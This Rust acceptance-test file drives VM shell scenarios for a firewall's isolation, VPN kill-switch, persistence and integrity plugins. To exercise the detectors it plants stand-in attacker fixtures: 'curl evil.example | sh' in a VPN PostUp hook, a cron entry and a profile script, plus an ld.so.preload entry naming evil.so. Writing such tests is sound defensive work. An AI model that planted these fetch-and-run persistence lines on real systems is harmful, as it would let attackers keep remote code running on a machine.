// SPDX-FileCopyrightText: 2026 Nubian Ibex and IbexWall contributors
// SPDX-License-Identifier: GPL-3.0-or-later

//! F9 VM phase: VPN and endpoint plugins on real machines. Scenario scripts
//! are plain strings (no `format!`), so shell and JSON braces stay as
//! written; they share the helpers in `LIB`.

use std::path::Path;

use anyhow::Result;

use super::f1::{install_plugin, provision, run_script, start_daemon};
use super::vm::{Vm, run_capture};

const PLUGINS: [&str; 4] = [
    "endpoint.isolate",
    "net.vpn",
    "endpoint.persistence",
    "endpoint.integrity",
];

const LIB: &str = r#"
set -e
JSON_ID="python3 -c 'import json,sys;t=sys.stdin.read();i=t.find(\"{\");d=json.JSONDecoder().raw_decode(t[i:])[0] if i>=0 else {};t=d.get(\"plan\") or d.get(\"transaction\");print(t[\"id\"] if isinstance(t,dict) else t)'"
# Plan and apply, leaving the transaction in TX and its output in OUT.
# Network changes wait for a confirmation: the caller decides.
apply_plan() {
  PLUGIN=$1; shift
  P=$(sudo ibexctl plan "$PLUGIN" "$@" --json 2>/tmp/plan.err | eval "$JSON_ID") || { echo "PLAN FAILED: $(cat /tmp/plan.err)"; return 1; }
  OUT=$(sudo ibexctl apply "$P" --confirm-timeout ${CONFIRM:-300} --json 2>/tmp/apply.err || true)
  TX=$(echo "$OUT" | eval "$JSON_ID")
  [ -n "$TX" ] || { echo "APPLY FAILED: $OUT"; sudo journalctl -u ibexwalld -n 20 --no-pager; return 1; }
}
confirm_tx() { sudo ibexctl confirm "$TX" >/dev/null || { echo "CONFIRM FAILED"; return 1; }; }
# Can this machine open a TCP connection to $1:$2 within 4 seconds?
reach() { timeout 4 bash -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null; }
# Every table but ours, as a digest: proof that nothing else was touched.
foreign_digest() { sudo nft list ruleset 2>/dev/null | python3 -c '
import re,sys
text = sys.stdin.read()
blocks = re.split(r"(?m)^(?=table )", text)
print("".join(b for b in blocks if b and not b.startswith("table inet ibexwall")))' | sha256sum; }
pkg() {
  if command -v dnf >/dev/null; then sudo dnf install -y -q "$@"
  elif command -v apt-get >/dev/null; then sudo apt-get update -qq; sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "$@"
  elif command -v pacman >/dev/null; then sudo pacman -Sy --noconfirm --needed "$@"
  fi
}
"#;

const ISOLATE: &str = r#"
sudo ibexctl plugins enable endpoint.isolate >/dev/null
PEER=${SSH_CLIENT%% *}
[ -n "$PEER" ] || { echo "NO SSH PEER"; exit 1; }
FOREIGN=$(foreign_digest)
if reach 1.1.1.1 443; then OUTSIDE=yes; else OUTSIDE=no; fi
echo "METRIC: peer $PEER, the internet is reachable before: $OUTSIDE"

# An empty allow list would cut the machine off for good: refused.
if sudo ibexctl plan endpoint.isolate --json >/dev/null 2>&1; then echo "AN EMPTY ALLOW LIST WAS PLANNED"; exit 1; fi

# A real local service, to prove loopback survives.
python3 -m http.server 18080 --bind 127.0.0.1 >/dev/null 2>&1 &
SRV=$!
trap 'kill $SRV 2>/dev/null || true' EXIT
sleep 1

apply_plan endpoint.isolate --set allow=$PEER
echo "$OUT" | grep -q pending_confirm || { echo "NO CONFIRMATION WINDOW: $OUT"; exit 1; }

# Isolated: our own session lives, loopback works, the rest is gone.
sudo nft list chain inet ibexwall endpoint_isolate_out >/dev/null
sudo nft list chain inet ibexwall endpoint_isolate_in >/dev/null
reach 127.0.0.1 18080 || { echo "LOOPBACK BROKE"; exit 1; }
if reach 1.1.1.1 443; then echo "THE INTERNET IS STILL REACHABLE"; exit 1; fi
if reach 9.9.9.9 53; then echo "ANOTHER ADDRESS IS STILL REACHABLE"; exit 1; fi
if timeout 5 getent hosts example.com >/dev/null 2>&1; then echo "DNS STILL ANSWERS"; exit 1; fi
confirm_tx
sudo ibexctl check endpoint.isolate --json | python3 -c '
import json,sys
ids = [f["id"] for f in json.load(sys.stdin)["findings"]]
assert "isolate.active" in ids, ids'
echo "METRIC: isolated: session, loopback kept; internet, other hosts and DNS cut"

# Undo: everything back, nothing else touched.
sudo ibexctl rollback "$TX" >/dev/null || { echo "ROLLBACK FAILED"; sudo journalctl -u ibexwalld -n 10 --no-pager; exit 1; }
if sudo nft list chain inet ibexwall endpoint_isolate_out >/dev/null 2>&1; then echo "THE OUTPUT CHAIN SURVIVED"; exit 1; fi
if sudo nft list chain inet ibexwall endpoint_isolate_in >/dev/null 2>&1; then echo "THE INPUT CHAIN SURVIVED"; exit 1; fi
sudo test ! -e /etc/ibexwall/isolate/active.json || { echo "THE MARKER SURVIVED"; exit 1; }
[ "$(foreign_digest)" = "$FOREIGN" ] || { echo "ANOTHER TABLE CHANGED"; exit 1; }
if [ "$OUTSIDE" = yes ]; then reach 1.1.1.1 443 || { echo "THE INTERNET DID NOT COME BACK"; exit 1; }; fi
echo "METRIC: rolled back: chains and marker gone, foreign tables identical, network back"

# Not confirmed: it undoes itself.
CONFIRM=8 apply_plan endpoint.isolate --set allow=$PEER
sleep 20
if sudo nft list chain inet ibexwall endpoint_isolate_out >/dev/null 2>&1; then echo "AN UNCONFIRMED ISOLATION STAYED"; exit 1; fi
sudo test ! -e /etc/ibexwall/isolate/active.json || { echo "THE MARKER STAYED"; exit 1; }
echo "METRIC: an unconfirmed isolation reverted on its own"
"#;

const VPN: &str = r#"
sudo ibexctl plugins enable net.vpn >/dev/null
pkg wireguard-tools tcpdump curl
if ! sudo systemctl cat NetworkManager.service >/dev/null 2>&1; then
  if command -v apt-get >/dev/null; then pkg network-manager; else pkg networkmanager; fi
fi
# NetworkManager manages only WireGuard devices here: the test must not
# take the VM's own network away from whatever manages it.
sudo mkdir -p /etc/NetworkManager/conf.d
printf '[keyfile]\nunmanaged-devices=*,except:type:wireguard\n' | sudo tee /etc/NetworkManager/conf.d/00-ibexwall-test.conf >/dev/null
sudo systemctl enable --now NetworkManager
sleep 3

IFACE=$(ip -4 route show default | awk '{print $5; exit}')
PEER=${SSH_CLIENT%% *}
[ -n "$IFACE" ] && [ -n "$PEER" ] || { echo "NO UPLINK OR PEER"; exit 1; }

# The "VPN provider": a namespace with a WireGuard server, reached over a veth.
sudo ip netns del vpnsrv 2>/dev/null || true
sudo ip link del vethc 2>/dev/null || true
sudo ip netns add vpnsrv
sudo ip link add vethc type veth peer name veths
sudo ip link set veths netns vpnsrv
sudo ip addr add 10.99.0.1/24 dev vethc && sudo ip link set vethc up
sudo ip netns exec vpnsrv ip addr add 10.99.0.2/24 dev veths
sudo ip netns exec vpnsrv ip link set veths up
sudo ip netns exec vpnsrv ip link set lo up
SK=$(wg genkey); SP=$(echo "$SK" | wg pubkey); CK=$(wg genkey); CP=$(echo "$CK" | wg pubkey)
echo "$SK" | sudo tee /tmp/vpn-server.key >/dev/null && sudo chmod 600 /tmp/vpn-server.key
sudo ip netns exec vpnsrv ip link add wgs type wireguard
sudo ip netns exec vpnsrv wg set wgs listen-port 51820 private-key /tmp/vpn-server.key peer "$CP" allowed-ips 10.100.0.2/32
sudo ip netns exec vpnsrv ip addr add 10.100.0.1/24 dev wgs
sudo ip netns exec vpnsrv ip link set wgs up
printf '[Interface]\nPrivateKey = %s\nAddress = 10.100.0.2/24\n\n[Peer]\nPublicKey = %s\nEndpoint = 10.99.0.2:51820\nAllowedIPs = 0.0.0.0/0\nPersistentKeepalive = 3\n' "$CK" "$SP" > /tmp/lab.conf
printf '[Interface]\nPrivateKey = %s\nPostUp = curl evil.example | sh\n\n[Peer]\nPublicKey = %s\n' "$CK" "$SP" > /tmp/bad.conf

# Refusals: no known server, a profile with a hook.
if sudo ibexctl plan net.vpn --set action=killswitch --json >/dev/null 2>&1; then echo "A KILL SWITCH WAS PLANNED WITHOUT A SERVER"; exit 1; fi
if sudo ibexctl plan net.vpn --set action=import --set name=bad --set-file profile=/tmp/bad.conf --json >/dev/null 2>&1; then echo "A PROFILE WITH POSTUP WAS ACCEPTED"; exit 1; fi

# The private key is in no preview.
sudo ibexctl plan net.vpn --set action=import --set name=lab --set-file profile=/tmp/lab.conf --json > /tmp/vpn-plan.json
if grep -q "$CK" /tmp/vpn-plan.json; then echo "THE PRIVATE KEY IS IN THE PLAN PREVIEW"; exit 1; fi
grep -q "private file" /tmp/vpn-plan.json || { echo "THE PREVIEW DOES NOT SAY THE FILE IS PRIVATE"; exit 1; }
FOREIGN=$(foreign_digest)

# Import: NetworkManager watches its directory and takes the profile in;
# nothing is restarted.
apply_plan net.vpn --set action=import --set name=lab --set-file profile=/tmp/lab.conf
AUTO=yes
UP=no; for i in $(seq 1 30); do if ping -c1 -W1 10.100.0.1 >/dev/null 2>&1; then UP=yes; break; fi; sleep 1; done
if [ "$UP" != yes ]; then
  AUTO=no
  sudo nmcli connection up ibexwall-lab >/dev/null 2>&1 || true
  for i in $(seq 1 10); do if ping -c1 -W1 10.100.0.1 >/dev/null 2>&1; then UP=yes; break; fi; sleep 1; done
fi
if [ "$UP" != yes ]; then echo "THE TUNNEL DID NOT COME UP"; sudo nmcli -t connection show; sudo journalctl -u NetworkManager -n 25 --no-pager; exit 1; fi
[ "$AUTO" = yes ] && echo "METRIC: NetworkManager took the profile in by itself (no restart)"
if echo "$OUT" | grep -q pending_confirm; then confirm_tx; fi
IMPORT_TX=$TX
[ "$(sudo stat -c %a /etc/NetworkManager/system-connections/ibexwall-lab.nmconnection)" = 600 ] || { echo "THE KEYFILE IS NOT PRIVATE"; exit 1; }
sudo nmcli -t -f NAME,TYPE connection show --active | grep -q '^ibexwall-lab:wireguard' || { echo "NOT ACTIVE IN NETWORKMANAGER"; exit 1; }
HS=$(sudo ip netns exec vpnsrv wg show wgs latest-handshakes | awk '{print $2}')
[ "${HS:-0}" -gt 0 ] || { echo "NO HANDSHAKE AT THE SERVER"; exit 1; }
echo "METRIC: imported through NetworkManager, tunnel up, handshake seen, keyfile 0600, key absent from the preview"

# Without a kill switch, a dropped tunnel leaks: the capture sees it.
leak_count() {
  sudo rm -f /tmp/leak.pcap
  sudo timeout 14 tcpdump -n -i "$IFACE" -w /tmp/leak.pcap "ip and not host $PEER and not (udp and (port 67 or port 68))" >/dev/null 2>&1 &
  TD=$!
  sleep 2
  timeout 4 curl -s -m 3 http://1.1.1.1 >/dev/null 2>&1 || true
  timeout 4 ping -c2 -W1 8.8.8.8 >/dev/null 2>&1 || true
  timeout 4 getent hosts example.org >/dev/null 2>&1 || true
  timeout 4 bash -c 'exec 3<>/dev/tcp/9.9.9.9/443' 2>/dev/null || true
  wait $TD 2>/dev/null || true
  sudo tcpdump -nr /tmp/leak.pcap 2>/dev/null | wc -l
}
tunnel_up() { sudo nmcli connection up ibexwall-lab >/dev/null 2>&1; for i in $(seq 1 30); do ping -c1 -W1 10.100.0.1 >/dev/null 2>&1 && return 0; sleep 1; done; return 1; }
sudo nmcli connection down ibexwall-lab >/dev/null
BASE=$(leak_count)
[ "$BASE" -gt 0 ] || { echo "THE CAPTURE SAW NOTHING WITHOUT A KILL SWITCH, SO IT PROVES NOTHING"; exit 1; }
echo "METRIC: without a kill switch the dropped tunnel leaked $BASE packets"
tunnel_up || { echo "THE TUNNEL DID NOT COME BACK"; exit 1; }

# The kill switch.
sudo ibexctl check net.vpn --json | python3 -c '
import json,sys
ids = [f["id"] for f in json.load(sys.stdin)["findings"]]
assert "vpn.no_killswitch" in ids, ids'
apply_plan net.vpn --set action=killswitch --set allow=$PEER
echo "$OUT" | grep -q pending_confirm || { echo "NO CONFIRMATION WINDOW: $OUT"; exit 1; }
ping -c2 -W2 10.100.0.1 >/dev/null || { echo "THE TUNNEL STOPPED WORKING UNDER THE KILL SWITCH"; exit 1; }
confirm_tx
KS_TX=$TX
sudo nft list chain inet ibexwall net_vpn_out >/dev/null
sudo ibexctl check net.vpn --json | python3 -c '
import json,sys
ids = [f["id"] for f in json.load(sys.stdin)["findings"]]
assert "vpn.no_killswitch" not in ids, ids'

# Tunnel down with the kill switch: nothing leaves, our session lives.
sudo nmcli connection down ibexwall-lab >/dev/null
LEAK=$(leak_count)
[ "$LEAK" = 0 ] || { echo "LEAK: $LEAK packets left the uplink with the tunnel down"; sudo tcpdump -nr /tmp/leak.pcap 2>/dev/null | head -8; exit 1; }
sudo ibexctl check net.vpn --json | python3 -c '
import json,sys
ids = [f["id"] for f in json.load(sys.stdin)["findings"]]
assert "vpn.blocked" in ids, ids'
echo "METRIC: with the kill switch and the tunnel down, 0 packets left the uplink (baseline leaked $BASE)"

# It does not stand in the way of the tunnel coming back.
tunnel_up || { echo "THE TUNNEL COULD NOT RECONNECT UNDER THE KILL SWITCH"; exit 1; }
echo "METRIC: the tunnel reconnected under the kill switch"

# Undo both; nothing else was touched.
sudo ibexctl rollback "$KS_TX" >/dev/null || { echo "KILL SWITCH ROLLBACK FAILED"; exit 1; }
if sudo nft list chain inet ibexwall net_vpn_out >/dev/null 2>&1; then echo "THE KILL SWITCH CHAIN SURVIVED"; exit 1; fi
sudo test ! -e /etc/ibexwall/vpn/killswitch.json || { echo "THE MARKER SURVIVED"; exit 1; }
sudo ibexctl rollback "$IMPORT_TX" >/dev/null || { echo "IMPORT ROLLBACK FAILED"; exit 1; }
for i in $(seq 1 20); do ip link show wgib-lab >/dev/null 2>&1 || break; sleep 1; done
sudo test ! -e /etc/NetworkManager/system-connections/ibexwall-lab.nmconnection || { echo "THE KEYFILE SURVIVED"; exit 1; }
sudo test ! -e /etc/ibexwall/vpn/profiles/lab.json || { echo "THE RECORD SURVIVED"; exit 1; }
if ip link show wgib-lab >/dev/null 2>&1; then
  echo "THE INTERFACE SURVIVED"
  sudo nmcli device status || true
  sudo nmcli connection show || true
  sudo journalctl -u NetworkManager --no-pager -n 40 || true
  exit 1
fi
[ "$(foreign_digest)" = "$FOREIGN" ] || { echo "ANOTHER TABLE CHANGED"; exit 1; }
sudo ip netns del vpnsrv; sudo ip link del vethc 2>/dev/null || true
echo "METRIC: both rolled back: chain, marker, keyfile, record and interface gone; foreign tables identical"
"#;

const PERSISTENCE: &str = r#"
trap 'sudo rm -f /etc/ld.so.preload' EXIT
sudo ibexctl plugins enable endpoint.persistence >/dev/null
# The check's reply carries the findings (outcomes go to the posture).
check_ids() { sudo ibexctl check endpoint.persistence --json >/tmp/p-check.json 2>/dev/null || true; python3 -c 'import json
print(" ".join(f["id"] for f in json.load(open("/tmp/p-check.json"))["findings"]))'; }

# Nothing to compare against yet: said, not guessed.
LINE=$(check_ids); [ -z "$LINE" ] || { echo "WITHOUT A BASELINE: $LINE"; exit 1; }

# The persistence cases: a timer and its service, cron, shell profile,
# autostart, and a preloaded library.
printf '[Unit]\nDescription=evil\n' | sudo tee /etc/systemd/system/persist-evil.service >/dev/null
printf '[Timer]\nOnBootSec=10\n[Install]\nWantedBy=timers.target\n' | sudo tee /etc/systemd/system/persist-evil.timer >/dev/null
sudo mkdir -p /etc/cron.d /etc/profile.d
printf '* * * * * root curl evil.example | sh\n' | sudo tee /etc/cron.d/persist-evil >/dev/null
printf 'curl evil.example | sh\n' | sudo tee /etc/profile.d/persist-evil.sh >/dev/null
sudo mkdir -p /root/.config/autostart
printf '[Desktop Entry]\nType=Application\nExec=/usr/local/bin/evil\n' | sudo tee /root/.config/autostart/persist-evil.desktop >/dev/null
printf '/usr/local/lib/evil.so\n' | sudo tee /etc/ld.so.preload >/dev/null

# The preload is worth a finding even before any baseline exists.
LINE=$(check_ids); [ "$LINE" = "persistence.preload" ] || { echo "PRELOAD NOT SEEN: $LINE"; exit 1; }

# The person accepts what is there now.
apply_plan endpoint.persistence --set action=baseline
if echo "$OUT" | grep -q pending_confirm; then echo "A BASELINE SHOULD NOT NEED A CONFIRMATION"; exit 1; fi
LINE=$(check_ids); [ "$LINE" = "persistence.preload" ] || { echo "AFTER THE BASELINE: $LINE"; exit 1; }
echo "METRIC: baseline accepted; the five artifacts are quiet, the preload still speaks"

# One new and one changed entry.
printf '0 3 * * * root backup\n' | sudo tee /etc/cron.d/persist-new >/dev/null
printf 'wget evil.example\n' | sudo tee /etc/profile.d/persist-evil.sh >/dev/null
LINE=$(check_ids)
[ "$LINE" = "persistence.preload persistence.new persistence.changed" ] || { echo "CHANGES NOT SEEN: $LINE"; exit 1; }
for id in persistence.preload persistence.new persistence.changed; do
  echo "$LINE" | grep -q "$id" || { echo "MISSING $id: $LINE"; exit 1; }
done
sudo ibexctl check endpoint.persistence --json | python3 -c '
import json,sys
paths = " ".join(f["args"].get("path","") for f in json.load(sys.stdin)["findings"])
for expected in ["/etc/cron.d/persist-new", "/etc/profile.d/persist-evil.sh", "evil.so"]:
    assert expected in paths, (expected, paths)
print("paths named")'
echo "METRIC: one new and one changed entry found, with their paths"

# Undoing the baseline goes back to nothing claimed.
sudo ibexctl rollback "$TX" >/dev/null || { echo "BASELINE ROLLBACK FAILED"; exit 1; }
sudo test ! -e /var/lib/ibexwall/persistence/baseline.json || { echo "THE BASELINE SURVIVED"; exit 1; }
LINE=$(check_ids); [ "$LINE" = "persistence.preload" ] || { echo "AFTER THE ROLLBACK: $LINE"; exit 1; }
echo "METRIC: baseline rolled back; honest again"
"#;

const INTEGRITY: &str = r#"
sudo ibexctl plugins enable endpoint.integrity >/dev/null
check_paths() { sudo ibexctl check endpoint.integrity --json >/tmp/i-check.json 2>/dev/null || true; python3 -c 'import json
print(" ".join(f["args"].get("path","") for f in json.load(open("/tmp/i-check.json"))["findings"]))'; }

# A machine as the package manager shipped it: quiet.
BEFORE=$(check_paths)
echo "$BEFORE" | grep -vq "^$" && { echo "ALREADY DIRTY BEFORE THE TEST: $BEFORE"; exit 1; }

# One altered program file: an extra byte on a real installed binary.
SIZE=$(stat -c %s /usr/bin/hostid)
printf 'x' | sudo tee -a /usr/bin/hostid >/dev/null
AFTER=$(check_paths)
echo "$AFTER" | grep -q '/usr/bin/hostid' || { echo "THE ALTERED BINARY WAS NOT SEEN: $AFTER"; exit 1; }
for path in $AFTER; do
  case "$path" in /etc/*) echo "A CONFIGURATION FILE WAS REPORTED: $path"; exit 1;; esac
done
sudo ibexctl check endpoint.integrity --json | python3 -c '
import json,sys
report = json.load(sys.stdin)
for f in report["findings"]:
    if f["id"] == "integrity.altered":
        assert f["severity"] == "high", f
print("severity high")'
echo "METRIC: the altered binary was found ($(echo $AFTER | wc -w) finding(s)), configuration files stayed out"

# Restored, quiet again.
sudo truncate -s "$SIZE" /usr/bin/hostid
RESTORED=$(check_paths)
[ "$RESTORED" = "$BEFORE" ] || { echo "NOT QUIET AFTER THE RESTORE: $RESTORED"; exit 1; }
echo "METRIC: restored to the shipped byte, the check is quiet again"
"#;

pub fn run(vm: &Vm, workspace: &Path, install: &str) -> Result<()> {
    println!("== f9: build ==");
    let mut args = vec!["build".to_string(), "--release".to_string()];
    for id in PLUGINS {
        args.push("-p".into());
        args.push(format!(
            "ibexwall-plugin-{}",
            id.rsplit('.').next().unwrap()
        ));
    }
    for package in ["ibexwall-exec", "ibexwall-cli", "ibexwall-core"] {
        args.push("-p".into());
        args.push(package.into());
    }
    args.push("--bins".into());
    run_capture("cargo", args, None, "building the F9 plugins")?;
    crate::devkey::run()?;
    provision(vm, workspace, install)?;
    for id in PLUGINS {
        install_plugin(vm, workspace, id)?;
    }
    start_daemon(vm)?;

    let mut failures = 0;
    macro_rules! scenario {
        ($name:expr, $body:expr) => {
            if !run_script(vm, $name, &[LIB, $body].concat()) {
                failures += 1;
            }
        };
    }

    scenario!(
        "e1 endpoint.isolate: the network is cut except the allow list, then comes back, or reverts unconfirmed",
        ISOLATE
    );

    scenario!(
        "p1 endpoint.persistence: the places a program stays are watched against an accepted baseline",
        PERSISTENCE
    );

    scenario!(
        "i1 endpoint.integrity: an altered installed file is found, configuration stays out",
        INTEGRITY
    );

    scenario!(
        "v1 net.vpn: a WireGuard profile comes up through NetworkManager, and a dropped tunnel leaks nothing under the kill switch",
        VPN
    );

    if failures == 0 {
        println!("PASS: f9 acceptance suite (all scenarios)");
        Ok(())
    } else {
        anyhow::bail!("{failures} f9 scenario(s) failed")
    }
}
